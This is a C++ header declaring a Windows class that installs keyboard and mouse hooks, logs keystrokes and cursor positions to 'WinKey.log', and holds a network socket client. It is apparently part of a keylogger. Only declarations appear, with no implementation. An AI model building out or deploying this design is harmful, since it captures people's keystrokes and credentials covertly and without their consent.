#ifndef		_WORKING_H_
#define		_WORKING_H_

#include "WinSocket.h"
#include <fstream>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <windows.h>
#include <Winuser.h>

#define	DEBUG

#define OUTFILE_NAME	"Logs\\WinKey.log"
#define CLASSNAME	"working"
#define WINDOWTITLE	"spider"

class Working
{
public:
	Working(HINSTANCE thisinstance, HOOKPROC handlemouse = NULL, HOOKPROC handlekeys = NULL, WNDPROC windowprocedure = NULL);
	~Working();

	int Work();
	static void fillData(std::string);
	static void fillData(long x, long y);
	static std::vector<std::string>& Data(std::string str);
	void printData() const;

private:

	HWND		hwnd;
	HWND		fgwindow;
	WNDCLASSEX	windowclass;
	HINSTANCE	modulehandle;

	HOOKPROC	m_handlemouse;
	HOOKPROC	m_handlekeys;

	char	windir[MAX_PATH + 1];
	MSG		msg;

	WinSocket	*client;
};

#endif	/* _WORKING_H_ */